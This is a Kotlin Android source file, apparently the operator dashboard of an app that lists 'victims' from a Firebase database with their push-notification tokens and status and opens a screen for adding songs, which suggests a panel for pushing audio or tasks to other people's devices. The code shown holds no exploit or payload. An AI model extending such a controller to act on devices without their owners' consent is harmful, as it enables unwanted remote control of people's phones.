package com.googli.gttsedashboard

import android.content.Intent
import android.support.v7.app.AppCompatActivity
import android.os.Bundle
import android.support.v7.widget.LinearLayoutManager
import android.support.v7.widget.RecyclerView
import android.widget.TextView
import com.google.firebase.database.DataSnapshot
import com.google.firebase.database.DatabaseError
import com.google.firebase.database.FirebaseDatabase
import com.google.firebase.database.ValueEventListener
import kotlinx.android.synthetic.main.activity_main.*
import java.util.ArrayList


class MainActivity : AppCompatActivity() {

    var victimList = ArrayList<Victim>()
    lateinit var victimAdaptor: victimAdaptor
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)
        getVictims()
        findViewById<TextView>(R.id.Add).setOnClickListener {
            startActivity(Intent(this, AddSongActivity::class.java))
        }

    }

    fun getVictims() {

        val victimList = ArrayList<Victim>()

        FirebaseDatabase.getInstance().reference.addListenerForSingleValueEvent(object : ValueEventListener {
            override fun onDataChange(dataSnapshot: DataSnapshot?) {
                for (data in dataSnapshot!!.children) {
                    val victim = Victim()
                    victim.Name = data.key
                    victim.token = data.child("FCMToken").value.toString()
                    victim.status = data.child("Status").value.toString()
                    if (victim.Name != "Tracks" && victim.Name != "Task" && victim.Name != "Status") {
                        victimList.add(victim)
                    }
                }
                setRecyclerView(victimList)
            }

            override fun onCancelled(p0: DatabaseError?) {
                TODO("not implemented") //To change body of created functions use File | Settings | File Templates.
            }
        })
    }

    fun setRecyclerView(victimList: ArrayList<Victim>) {
        this.victimList = victimList
        val recyclerView = findViewById<RecyclerView>(R.id.RecyclerView)
        recyclerView.layoutManager = LinearLayoutManager(this)
        victimAdaptor = victimAdaptor(this, victimList)
        recyclerView.adapter = victimAdaptor
        Refresh.setOnClickListener {
            victimAdaptor.refreshVictims()
        }
    }


}
